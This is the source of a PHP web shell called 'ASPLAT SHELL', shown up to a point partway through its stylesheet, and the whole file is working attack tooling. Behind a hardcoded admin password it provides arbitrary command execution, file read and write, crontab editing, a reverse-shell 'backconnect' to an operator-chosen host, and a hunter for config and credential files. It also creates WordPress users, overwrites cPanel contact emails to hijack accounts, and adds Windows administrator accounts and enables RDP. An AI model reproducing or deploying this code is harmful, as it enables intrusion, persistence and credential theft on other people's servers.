<?php
session_start();
error_reporting(0);

// Login Configuration - CHANGE THESE!
$valid_username = "admin";
$valid_password = "admin123";

// Check if user is logged in
function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['login_time'] = time();
        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password!";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Auto-logout after 1 hour of inactivity
if (isLoggedIn() && (time() - $_SESSION['login_time']) > 3600) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login page
if (!isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>ASPLAT SHELL - Login</title>
        <meta charset="UTF-8">
        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { 
                margin: 0; 
                padding: 0; 
                box-sizing: border-box; 
            }
            
            body { 
                background-color: black;
                font-family: 'Inter', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333;
            }
            
            .login-container {
                background: rgba(255, 255, 255, 0.95);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                width: 100%;
                max-width: 400px;
                backdrop-filter: blur(10px);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-header h1 {
                color: #2c3e50;
                margin-bottom: 10px;
                font-size: 28px;
            }
            
            .login-header p {
                color: #7f8c8d;
                font-size: 14px;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 500;
                color: #2c3e50;
            }
            
            .form-group input {
                width: 100%;
                padding: 12px 15px;
                border: 2px solid #e1e8ed;
                border-radius: 8px;
                font-size: 14px;
                transition: all 0.3s ease;
                background: #fff;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #3498db;
                box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(135deg, #3498db, #2980b9);
                color: white;
                border: none;
                padding: 12px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
            }
            
            .error-message {
                background: #e74c3c;
                color: white;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                font-size: 14px;
            }
            
            .security-notice {
                background: #f8f9fa;
                border: 1px solid #e1e8ed;
                border-radius: 8px;
                padding: 15px;
                margin-top: 20px;
                font-size: 12px;
                color: #7f8c8d;
            }
            
            .image-container {
                width: 100%;
                height: 80px;
                border-radius: 8px;
                overflow: hidden;
                margin-bottom: 20px;
            }
            
            .full-size-image {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="image-container">
                <img src="https://a.top4top.io/p_356308my91.gif" alt="ASPLAT Shell" class="full-size-image">
            </div>
            
            <div class="login-header">
                <h1><i class="fas fa-terminal"></i> ASPLAT SHELL</h1>
                <p>Secure Access Required</p>
            </div>
            
            <?php if (isset($login_error)): ?>
                <div class="error-message">
                    <i class="fas fa-exclamation-triangle"></i> <?php echo $login_error; ?>
                </div>
            <?php endif; ?>
            
            <form method="post">
                <div class="form-group">
                    <label for="username"><i class="fas fa-user"></i> Username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                
                <div class="form-group">
                    <label for="password"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" name="login" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> Login
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// MAIN SHELL CODE STARTS
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
if (!is_dir($current_dir)) {
    $current_dir = '.';
}

$home_dir = realpath(dirname(__FILE__));

// Handle AJAX actions
if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'execute_command':
                $output = [];
                $return_var = 0;
                @exec($_POST['command'] . ' 2>&1', $output, $return_var);
                echo json_encode([
                    'success' => true,
                    'command' => $_POST['command'],
                    'output' => implode("\n", $output),
                    'return_var' => $return_var
                ]);
                exit;
                
            case 'get_file_content':
                if (isset($_POST['filepath']) && file_exists($_POST['filepath']) && !is_dir($_POST['filepath'])) {
                    echo json_encode([
                        'success' => true,
                        'content' => file_get_contents($_POST['filepath'])
                    ]);
                } else {
                    echo json_encode([
                        'success' => false,
                        'error' => 'File not found'
                    ]);
                }
                exit;
                
            case 'save_file_content':
                if (isset($_POST['filepath']) && isset($_POST['content'])) {
                    if (file_put_contents($_POST['filepath'], $_POST['content']) !== false) {
                        echo json_encode(['success' => true]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Failed to save file']);
                    }
                }
                exit;
                
            case 'view_crontab':
                $output = [];
                @exec('crontab -l 2>&1', $output, $return_var);
                if ($return_var !== 0) {
                    echo json_encode([
                        'success' => false,
                        'output' => "No crontab for current user or error reading crontab\n" . implode("\n", $output)
                    ]);
                } else {
                    echo json_encode([
                        'success' => true,
                        'output' => implode("\n", $output)
                    ]);
                }
                exit;
                
            case 'save_crontab':
                if (isset($_POST['crontab_content'])) {
                    $temp_file = tempnam(sys_get_temp_dir(), 'crontab');
                    file_put_contents($temp_file, $_POST['crontab_content']);
                    @exec('crontab ' . escapeshellarg($temp_file) . ' 2>&1', $output, $return_var);
                    @unlink($temp_file);
                    
                    if ($return_var === 0) {
                        echo json_encode([
                            'success' => true,
                            'output' => "Crontab updated successfully!"
                        ]);
                    } else {
                        echo json_encode([
                            'success' => false,
                            'output' => "Error updating crontab: " . implode("\n", $output)
                        ]);
                    }
                }
                exit;

            case 'add_wp_user':
                $username = $_POST['username'] ?? '';
                $password = $_POST['password'] ?? '';
                $email = $_POST['email'] ?? '';
                $role = $_POST['role'] ?? 'subscriber';
                $wp_config_path = $_POST['wp_config_path'] ?? '';
                
                if (!$username || !$password || !$email || !$wp_config_path) {
                    echo json_encode(['success' => false, 'output' => 'All fields are required']);
                    exit;
                }
                
                $output = addWordPressUser($username, $password, $email, $role, $wp_config_path);
                echo json_encode($output);
                exit;

            case 'scan_ports':
                $host = $_POST['host'] ?? 'localhost';
                $ports = $_POST['ports'] ?? '21,22,23,25,53,80,110,115,135,139,143,194,443,445,993,995,1433,3306,3389,5432,5900,6379,27017';
                $output = scanPorts($host, $ports);
                echo json_encode($output);
                exit;

            case 'scan_webshells':
                $scan_path = $_POST['scan_path'] ?? '/var/www';
                $output = scanWebshells($scan_path);
                echo json_encode($output);
                exit;

            case 'delete_webshell':
                $file_path = $_POST['file_path'] ?? '';
                if ($file_path && file_exists($file_path)) {
                    if (unlink($file_path)) {
                        echo json_encode(['success' => true, 'output' => 'File deleted successfully']);
                    } else {
                        echo json_encode(['success' => false, 'output' => 'Failed to delete file']);
                    }
                } else {
                    echo json_encode(['success' => false, 'output' => 'File not found']);
                }
                exit;

            case 'get_webshell_code':
                $file_path = $_POST['file_path'] ?? '';
                if ($file_path && file_exists($file_path)) {
                    $content = file_get_contents($file_path);
                    echo json_encode(['success' => true, 'content' => $content]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'File not found']);
                }
                exit;

            case 'backconnect':
                $host = $_POST['host'] ?? '';
                $port = $_POST['port'] ?? '4444';
                $output = backconnect($host, $port);
                echo json_encode($output);
                exit;

            case 'scan_config_files':
                $scan_path = $_POST['scan_path'] ?? '/var/www';
                $output = scanConfigFiles($scan_path);
                echo json_encode($output);
                exit;

            case 'reset_cpanel':
                $email = $_POST['email'] ?? '';
                $output = resetCpanel($email);
                echo json_encode($output);
                exit;

            case 'zip_files':
                $files = $_POST['files'] ?? [];
                $zip_name = $_POST['zip_name'] ?? 'archive.zip';
                $output = createZip($files, $zip_name, $current_dir);
                echo json_encode($output);
                exit;

            case 'unzip_file':
                $zip_file = $_POST['zip_file'] ?? '';
                $extract_path = $_POST['extract_path'] ?? '';
                $output = extractZip($zip_file, $extract_path);
                echo json_encode($output);
                exit;

            case 'add_rdp_user':
                $username = $_POST['username'] ?? '';
                $password = $_POST['password'] ?? '';
                $output = addRdpUser($username, $password);
                echo json_encode($output);
                exit;

            case 'enable_rdp':
                $output = enableRdp();
                echo json_encode($output);
                exit;
        }
    }
    exit;
}

// WordPress User Function
function addWordPressUser($username, $password, $email, $role, $wp_config_path) {
    if (!file_exists($wp_config_path)) {
        return ['success' => false, 'output' => 'WordPress config file not found'];
    }
    
    $wp_dir = dirname($wp_config_path);
    $wp_load = $wp_dir . '/wp-load.php';
    
    if (!file_exists($wp_load)) {
        return ['success' => false, 'output' => 'WordPress not found in this directory'];
    }
    
    $script = "<?php
define('WP_USE_THEMES', false);
require_once('$wp_load');

if (!function_exists('wp_create_user')) {
    echo 'WordPress functions not available';
    exit;
}

\$user_id = wp_create_user('$username', '$password', '$email');
if (is_wp_error(\$user_id)) {
    echo 'Error: ' . \$user_id->get_error_message();
} else {
    \$user = new WP_User(\$user_id);
    \$user->set_role('$role');
    echo 'User $username created successfully with role: $role';
}
?>";
    
    $temp_script = tempnam(sys_get_temp_dir(), 'wp_user_');
    file_put_contents($temp_script, $script);
    
    $output = [];
    exec("php " . escapeshellarg($temp_script) . " 2>&1", $output);
    unlink($temp_script);
    
    return ['success' => true, 'output' => implode("\n", $output)];
}

// Port Scanner Function
function scanPorts($host, $ports) {
    $port_list = explode(',', $ports);
    $results = [];
    
    foreach ($port_list as $port) {
        $port = trim($port);
        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
        
        if (is_resource($connection)) {
            $results[] = "Port $port: OPEN";
            fclose($connection);
        } else {
            $results[] = "Port $port: CLOSED";
        }
    }
    
    return ['success' => true, 'output' => implode("\n", $results)];
}

// Webshell Scanner Function
function scanWebshells($path) {
    $webshell_patterns = [
        '/eval\s*\(.*base64_decode/',
        '/system\s*\(/',
        '/exec\s*\(/',
        '/shell_exec\s*\(/',
        '/passthru\s*\(/',
        '/popen\s*\(/',
        '/proc_open/',
        '/`.*`/',
        '/assert\s*\(/',
        '/preg_replace\s*\(.*\/e/',
        '/create_function/',
        '/file_put_contents\s*\(.*\$_/',
        '/file_get_contents\s*\(.*\$_/',
        '/curl_exec/',
        '/wget\s+/',
        '/phpinfo\s*\(/'
    ];
    
    $suspicious_files = [];
    
    if (!is_dir($path)) {
        return ['success' => false, 'output' => 'Directory not found'];
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && in_array($file->getExtension(), ['php', 'phtml', 'txt', 'html', 'htm'])) {
            $content = file_get_contents($file->getPathname());
            $matches = [];
            
            foreach ($webshell_patterns as $pattern) {
                if (preg_match($pattern, $content)) {
                    $matches[] = $pattern;
                }
            }
            
            if (!empty($matches)) {
                $suspicious_files[] = [
                    'path' => $file->getPathname(),
                    'patterns' => $matches,
                    'size' => $file->getSize()
                ];
            }
        }
    }
    
    return ['success' => true, 'files' => $suspicious_files];
}

// Backconnect Function
function backconnect($host, $port) {
    $sock = @fsockopen($host, $port, $errno, $errstr, 30);
    
    if (!$sock) {
        return ['success' => false, 'output' => "Failed to connect: $errstr ($errno)"];
    }
    
    fwrite($sock, "Backconnect established from " . $_SERVER['REMOTE_ADDR'] . "\n");
    
    while (!feof($sock)) {
        fwrite($sock, "$ ");
        $cmd = fgets($sock);
        
        if (trim($cmd) == 'exit') {
            break;
        }
        
        $output = shell_exec($cmd);
        fwrite($sock, $output);
    }
    
    fclose($sock);
    return ['success' => true, 'output' => 'Backconnect session completed'];
}

// Config File Hunter
function scanConfigFiles($path) {
    $config_patterns = [
        'config.php',
        'configuration.php',
        'wp-config.php',
        'config.inc.php',
        'settings.php',
        '.env',
        'config.json',
        'config.xml',
        'database.yml',
        'database.json',
        'app.config',
        'web.config',
        'config.ini',
        '.htpasswd',
        '.htaccess'
    ];
    
    $found_files = [];
    
    if (!is_dir($path)) {
        return ['success' => false, 'output' => 'Directory not found'];
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filename = $file->getFilename();
            
            foreach ($config_patterns as $pattern) {
                if (fnmatch($pattern, $filename) || stripos($filename, 'config') !== false) {
                    $found_files[] = [
                        'path' => $file->getPathname(),
                        'size' => $file->getSize(),
                        'modified' => date('Y-m-d H:i:s', $file->getMTime())
                    ];
                    break;
                }
            }
        }
    }
    
    return ['success' => true, 'files' => $found_files];
}

// Reset cPanel Function
function resetCpanel($email) {
    $cpanel_dir = '/home/*/.cpanel/contactinfo';
    $contact_files = glob($cpanel_dir);
    
    if (empty($contact_files)) {
        return ['success' => false, 'output' => 'No cPanel contactinfo files found'];
    }
    
    $results = [];
    foreach ($contact_files as $file) {
        $content = "email: $email\n";
        if (file_put_contents($file, $content) !== false) {
            $results[] = "Updated: $file";
        } else {
            $results[] = "Failed: $file";
        }
    }
    
    return ['success' => true, 'output' => implode("\n", $results)];
}

// Zip Function
function createZip($files, $zip_name, $current_dir) {
    if (empty($files)) {
        return ['success' => false, 'output' => 'No files selected'];
    }
    
    $zip_path = $current_dir . '/' . $zip_name;
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            foreach ($files as $file) {
                $file_path = $current_dir . '/' . $file;
                if (file_exists($file_path)) {
                    if (is_dir($file_path)) {
                        addFolderToZip($zip, $file_path, $file);
                    } else {
                        $zip->addFile($file_path, $file);
                    }
                }
            }
            $zip->close();
            return ['success' => true, 'output' => "Zip file created: $zip_path"];
        } else {
            return ['success' => false, 'output' => 'Failed to create zip file'];
        }
    } else {
        $files_str = implode(' ', array_map('escapeshellarg', $files));
        $command = "cd " . escapeshellarg($current_dir) . " && zip -r " . escapeshellarg($zip_name) . " $files_str 2>&1";
        exec($command, $output, $return_var);
        
        if ($return_var === 0) {
            return ['success' => true, 'output' => "Zip file created: $zip_path\n" . implode("\n", $output)];
        } else {
            return ['success' => false, 'output' => "Failed to create zip file\n" . implode("\n", $output)];
        }
    }
}

function addFolderToZip($zip, $folder, $base_name) {
    $files = scandir($folder);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $file_path = $folder . '/' . $file;
        $local_path = $base_name . '/' . $file;
        
        if (is_dir($file_path)) {
            $zip->addEmptyDir($local_path);
            addFolderToZip($zip, $file_path, $local_path);
        } else {
            $zip->addFile($file_path, $local_path);
        }
    }
}

// Unzip Function
function extractZip($zip_file, $extract_path = null) {
    if (!file_exists($zip_file)) {
        return ['success' => false, 'output' => 'Zip file not found'];
    }
    
    if (!$extract_path) {
        $extract_path = dirname($zip_file);
    }
    
    if (!is_dir($extract_path)) {
        mkdir($extract_path, 0755, true);
    }
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($extract_path);
            $zip->close();
            return ['success' => true, 'output' => "Zip file extracted to: $extract_path"];
        } else {
            return ['success' => false, 'output' => 'Failed to extract zip file'];
        }
    } else {
        $command = "unzip -o " . escapeshellarg($zip_file) . " -d " . escapeshellarg($extract_path) . " 2>&1";
        exec($command, $output, $return_var);
        
        if ($return_var === 0) {
            return ['success' => true, 'output' => "Zip file extracted to: $extract_path\n" . implode("\n", $output)];
        } else {
            return ['success' => false, 'output' => "Failed to extract zip file\n" . implode("\n", $output)];
        }
    }
}

// RDP Functions for Windows
function addRdpUser($username, $password) {
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
    }
    
    $output = [];
    $return_var = 0;
    
    exec("net user " . escapeshellarg($username) . " " . escapeshellarg($password) . " /add 2>&1", $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "Failed to create user: " . implode("\n", $output)];
    }
    
    exec("net localgroup administrators " . escapeshellarg($username) . " /add 2>&1", $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "User created but failed to add to administrators: " . implode("\n", $output)];
    }
    
    return ['success' => true, 'output' => "User $username created and added to administrators group"];
}

function enableRdp() {
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
    }
    
    $output = [];
    $return_var = 0;
    
    exec('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1', $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "Failed to enable RDP: " . implode("\n", $output)];
    }
    
    exec('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 2>&1', $output, $return_var);
    
    return ['success' => true, 'output' => "RDP enabled and firewall configured"];
}

// Handle normal actions
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'download':
            if (isset($_GET['file']) && file_exists($_GET['file'])) {
                $file = $_GET['file'];
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                readfile($file);
                exit;
            }
            break;
            
        case 'delete':
            if (isset($_GET['file'])) {
                if (is_dir($_GET['file'])) {
                    @rmdir($_GET['file']);
                } else {
                    @unlink($_GET['file']);
                }
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'chmod':
            if (isset($_GET['file']) && isset($_GET['perm'])) {
                @chmod($_GET['file'], octdec($_GET['perm']));
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
    }
}

if (isset($_POST['action']) && !isset($_POST['ajax'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
                $target = $current_dir . '/' . $_FILES['file']['name'];
                @move_uploaded_file($_FILES['file']['tmp_name'], $target);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'mkdir':
            if (isset($_POST['dirname']) && !empty($_POST['dirname'])) {
                @mkdir($current_dir . '/' . $_POST['dirname'], 0755);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'newfile':
            if (isset($_POST['filename']) && !empty($_POST['filename'])) {
                $filepath = $current_dir . '/' . $_POST['filename'];
                @file_put_contents($filepath, $_POST['filecontent'] ?? '');
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'rename':
            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                @rename($_POST['oldname'], $_POST['newname']);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
    }
}

// Function to check if directory is writable
function is_writable_dir($dir) {
    if (!is_dir($dir)) return false;
    
    $test_file = $dir . '/test_' . uniqid() . '.tmp';
    $result = @file_put_contents($test_file, 'test');
    if ($result !== false) {
        @unlink($test_file);
        return true;
    }
    return false;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>ASPLAT SHELL</title>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2c3e50;
            --secondary: #3498db;
            --accent: #e74c3c;
            --success: #27ae60;
            --warning: #f39c12;
            --info: #17a2b8;
            --dark: #1a1a1a;
            --light: #f8f9fa;
            --sidebar-bg: #1e2a38;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --text-primary: #2c3e50;
            --text-secondary: #6c757d;
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body { 
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: var(--text-primary);
            font-family: 'Inter', sans-serif;
            line-height: 1.6;
            font-size: 14px;
            min-height: 100vh;
        }
        
        .container { 
            display: flex; 
            min-height: 100vh; 
        }
        
        .sidebar { 
            width: 280px;
            background: var(--sidebar-bg);
            padding: 20px;
            position: sticky;
            top: 0;
            align-self: flex-start;
            height: 100vh;
            overflow-y: auto;
            box-shadow: var(--shadow);
            z-index: 100;
        }
        
        .main { 
            flex: 1; 
            padding: 25px; 
            background: transparent;
            overflow-y: auto;
        }
        
        .header {
            background: var(--card-bg);
            padding: 20px; 
            margin-bottom: 25px; 
            border-radius: 10px;
            color: var(--text-primary);
            border: none;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--secondary), var(--accent));
        }
        
        .header h1 {
            margin: 0;
            font-size: 28px;
        }

        .header-icons {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .header-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            color: white;
            text-decoration: none;
            transition: var(--transition);
            font-size: 16px;
            border: 1px solid var(--border-color);
        }

        .header-icon:hover {
            background: var(--secondary);
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        
        .login-info {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-left: auto;
        }
        
        .logout-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 5px 12px;
            border-radius: 15px;
            text-decoration: none;
            font-size: 11px;
            transition: all 0.3s ease;
            margin-left: 10px;
        }
        
        .logout-btn:hover {
            background: rgba(255,255,255,0.3);
            transform: translateY(-1px);
        }
                
        .section { 
            background: var(--card-bg); 
            margin-bottom: 20px; 
            padding: 20px;
            border-radius: 10px;
            box-shadow: var(--shadow);
            border: none;
        }
        
        .file-list { 
            margin: 15px 0; 
        }
        
        .file-item { 
            padding: 12px 15px; 
            border-bottom: 1px solid var(--border-color); 
            display: flex; 
            align-items: center;
            transition: var(--transition);
            flex-wrap: wrap;
            border-radius: 5px;
            position: relative;
            cursor: pointer;
        }
        
        .file-item:hover { 
            background: #f1f8ff; 
            transform: translateY(-2px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        
        .file-item.selected {
            background: #e3f2fd;
            border-left: 3px solid var(--secondary);
        }
        
        .file-name { 
            flex: 1; 
            font-size: 14px; 
            font-family: 'Roboto Mono', monospace; 
            min-width: 200px;
            word-break: break-all;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-actions { 
            display: flex; 
            gap: 8px; 
            flex-wrap: wrap;
            margin: 5px 0;
        }
        
        .btn { 
            background: var(--secondary); 
            color: #ffffff; 
            border: none; 
            padding: 8px 14px; 
            cursor: pointer; 
            text-decoration: none; 
            font-size: 12px; 
            font-family: 'Inter', sans-serif;
            border-radius: 5px;
            transition: var(--transition);
            font-weight: 500;
            white-space: nowrap;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
        }
        
        .btn:disabled {
            background: #adb5bd;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .btn-danger { 
            background: var(--accent); 
        }
        
        .btn-success { 
            background: var(--success); 
        }
        
        .btn-warning { 
            background: var(--warning); 
            color: #000; 
        }
        
        .btn-info { 
            background: var(--info); 
        }
        
        .btn-secondary { 
            background: var(--text-secondary); 
        }
        
        .btn-primary {
            background: var(--primary);
        }
        
        input, textarea, select { 
            background: #ffffff; 
            color: var(--text-primary); 
            border: 1px solid var(--border-color); 
            padding: 10px; 
            margin: 5px 0;
            font-family: 'Roboto Mono', monospace;
            border-radius: 5px;
            width: 100%;
            font-size: 14px;
            transition: var(--transition);
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--secondary);
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
        }
        
        .terminal { 
            background: var(--card-bg); 
            border: none; 
            padding: 15px;
            border-radius: 10px;
            box-shadow: var(--shadow);
        }
        
        .terminal-output { 
            background: #2c3e50; 
            color: #ecf0f1; 
            height: 400px; 
            overflow-y: auto; 
            overflow-x: auto;
            padding: 15px; 
            border: none; 
            margin-bottom: 15px; 
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .terminal-input { 
            width: 100%; 
            background: #ffffff; 
            color: var(--text-primary); 
            border: 1px solid var(--border-color); 
            padding: 12px;
            font-family: 'Roboto Mono', monospace;
            border-radius: 5px;
            font-size: 14px;
        }
        
        .modal { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            background: rgba(0,0,0,0.5); 
            z-index: 1000;
            backdrop-filter: blur(5px);
        }
        
        .modal-content { 
            background: var(--card-bg); 
            margin: 40px auto; 
            padding: 30px; 
            border: none;
            width: 90%; 
            max-width: 800px; 
            max-height: 85vh; 
            overflow-y: auto;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            position: relative;
        }
        
        .modal-content::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--secondary), var(--accent));
            border-radius: 10px 10px 0 0;
        }
        
        .breadcrumb { 
            margin-bottom: 20px; 
            padding: 15px; 
            background: var(--card-bg); 
            border: none;
            border-radius: 10px;
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            word-break: break-all;
            box-shadow: var(--shadow);
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .breadcrumb a { 
            color: var(--secondary); 
            text-decoration: none; 
            font-weight: 500; 
        }
        
        .breadcrumb a:hover { 
            text-decoration: underline; 
            color: var(--primary); 
        }
        
        .current-path { 
            background: var(--card-bg); 
            padding: 12px; 
            border: none; 
            margin: 15px 0; 
            font-family: 'Roboto Mono', monospace;
            border-radius: 5px;
            font-size: 13px;
            word-break: break-all;
            box-shadow: var(--shadow);
        }
        
        .home-btn { 
            background: var(--secondary); 
            color: white; 
            border: none; 
            padding: 8px 16px; 
            cursor: pointer; 
            text-decoration: none; 
            display: inline-flex;
            align-items: center;
            gap: 5px;
            margin-left: 15px;
            border-radius: 5px;
            font-weight: 500;
            transition: var(--transition);
            font-size: 13px;
        }
        
        .bayy { 
            background: var(--border-color); 
            color: white; 
            border: none; 
            padding: 8px 16px; 
            cursor: pointer; 
            text-decoration: none; 
            display: inline-flex;
            align-items: center;
            gap: 5px;
            margin-left: 15px;
            border-radius: 5px;
            font-weight: 500;
            transition: var(--transition);
            font-size: 13px;
        }
        
        .home-btn:hover { 
            background: #2980b9;
            text-decoration: none;
            color: #ffffff;
            transform: translateY(-2px);
        }
        
        .file-info { 
            font-size: 11px; 
            color: var(--text-secondary); 
            margin-left: 15px; 
            font-family: 'Roboto Mono', monospace; 
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .dir-link { 
            color: var(--secondary); 
            text-decoration: none; 
            font-weight: 500; 
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .dir-link:hover { 
            text-decoration: underline; 
            color: var(--primary); 
        }
        
        .icon-folder { 
            color: var(--warning); 
        }
        
        .icon-file { 
            color: var(--info); 
        }
        
        .toolbar { 
            display: flex; 
            gap: 10px; 
            margin-bottom: 20px; 
            flex-wrap: wrap;
        }
        
        .system-info {
            background: var(--card-bg);
            color: var(--text-primary);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            border: none;
            word-break: break-all;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
        }
        
        .system-info::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(to bottom, var(--secondary), var(--accent));
        }
        
        h1, h2, h3, h4, h5, h6 {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 15px;
        }
        
        .nano-editor {
            background: #2c3e50;
            color: #ecf0f1;
            border: none;
            padding: 10px;
            font-family: 'Roboto Mono', monospace;
            width: 100%;
            height: 500px;
            resize: both;
            overflow: auto;
            font-size: 13px;
